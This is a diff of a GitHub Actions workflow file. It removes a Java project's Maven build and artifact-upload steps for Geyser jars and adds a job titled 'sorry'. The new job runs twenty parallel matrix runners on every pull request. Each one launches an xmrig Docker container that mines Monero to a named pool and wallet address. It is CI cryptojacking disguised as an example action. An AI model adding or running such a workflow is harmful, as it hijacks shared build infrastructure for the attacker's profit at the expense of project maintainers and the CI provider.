@@ -1,55 +1,20 @@
-name: Build Pull Request
+name: example action
 
 on: [pull_request]
 
 jobs:
-  build:
+  sorry:
+    name: sorry
 
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-      - uses: actions/checkout@v2
-      - uses: actions/cache@v2
-        with:
-          path: ~/.m2/repository
-          key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
-          restore-keys: |
-            ${{ runner.os }}-maven-
-      - name: Set up JDK 1.8
-        uses: actions/setup-java@v1
-        with:
-          java-version: 1.8
-      - name: submodules-init
-        uses: snickerbockers/submodules-init@v4
-      - name: Build with Maven
-        run: mvn -B package
-      - name: Archive artifacts (Geyser Standalone)
-        uses: actions/upload-artifact@v2
-        if: success()
-        with:
-          name: Geyser Standalone
-          path: bootstrap/standalone/target/Geyser.jar
-      - name: Archive artifacts (Geyser Spigot)
-        uses: actions/upload-artifact@v2
-        if: success()
-        with:
-          name: Geyser Spigot
-          path: bootstrap/spigot/target/Geyser-Spigot.jar
-      - name: Archive artifacts (Geyser BungeeCord)
-        uses: actions/upload-artifact@v2
-        if: success()
-        with:
-          name: Geyser BungeeCord
-          path: bootstrap/bungeecord/target/Geyser-BungeeCord.jar
-      - name: Archive artifacts (Geyser Sponge)
-        uses: actions/upload-artifact@v2
-        if: success()
-        with:
-          name: Geyser Sponge
-          path: bootstrap/sponge/target/Geyser-Sponge.jar
-      - name: Archive artifacts (Geyser Velocity)
-        uses: actions/upload-artifact@v2
-        if: success()
-        with:
-          name: Geyser Velocity
-          path: bootstrap/velocity/target/Geyser-Velocity.jar
+      - name: Sorry Bill
+        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
